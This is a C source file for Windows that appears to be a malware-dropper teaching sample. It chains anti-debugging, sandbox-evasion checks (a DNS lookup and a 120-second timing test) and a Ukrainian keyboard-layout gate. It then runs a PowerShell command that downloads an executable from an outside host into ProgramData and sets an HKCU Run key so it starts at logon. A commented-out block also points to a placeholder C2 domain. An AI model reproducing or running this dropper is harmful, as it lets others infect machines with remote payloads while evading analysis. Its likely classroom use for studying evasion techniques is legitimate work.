#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <winreg.h>

//#include <urlmon.h>


#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

// gcc .\sample.c -o sample.exe -lws2_32


BOOL check_network()
{

    WSADATA wsaData;
    int iResult;
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
        return FALSE;

    // Check DNS
    if (gethostbyname("www.microsoft.com") == NULL)
        return FALSE;

    return TRUE;

}


BOOL timing()
{

    DWORD dwStart = GetTickCount();

    // Sleep 120 seconds
    system("c:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"ping 127.0.0.1 -n 120  | Out-Null\"");

    DWORD dwDiff = GetTickCount() - dwStart;
    
    return (119000 < dwDiff && dwDiff < 122000);

}


BOOL check_keyboard()
{

    LPSTR kLayout;

    HKL _ = GetKeyboardLayout(0);
    GetKeyboardLayoutNameA(kLayout);
    //printf("LAYOUT_ID = %s\n", kLayout);

    if ( strcmp(kLayout, "00000422") != 0 && strcmp(kLayout, "00020422") )
        return FALSE;

    return TRUE;

}


BOOL download_sample()
{

    /*
    char* path = "C:\\ProgramData\\bicho.exe";
    char* url = "www.C2-DeLosMalos.net/bicho.exe";

    HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);

    if ( res != S_OK )
        return FALSE;

    return TRUE;
    */

   system("c:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"iwr  https://sapellaniz.github.io/assets/taller/bicho.exe -OutFile C:\\ProgramData\\bicho.exe | Out-Null\"");

    return TRUE;

}


BOOL persistence()
{

    LONG lRValue;
    HKEY hKey;
    const unsigned char *data = "C:\\ProgramData\\bicho.exe";

    lRValue = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
    if (lRValue != ERROR_SUCCESS)
        return FALSE;

    RegSetValueEx(hKey, "test", 0, REG_SZ, data, strlen(data));
    RegCloseKey(hKey);

    return TRUE;

}


int main(int argc, char **argv)
{

    /* 01- Anti-debug */
	if (IsDebuggerPresent())
	    exit(0);
    printf("Check 1.1 passed\n");


    /* 02- Sandbox evasion */
    if (!check_network())
        exit(0);
    printf("Check 2.1 passed\n");

    if (!timing())
        exit(0);
    printf("Check 2.2 passed\n");


    /* 03- Check keyboard layout */
    if (!check_keyboard())
        exit(0);
    printf("Check 3.1 passed\n");

    /* 04- Download */
    if (!download_sample())
        exit(0);
    printf("Check 4.1 passed\n");

    /* 05- Persistence */
    if (!persistence())
        exit(0);
    printf("Check 5.1 passed\n");



    /* END */
    printf("Press Any Key to Continue\n");
    getchar();
	return 0;
}
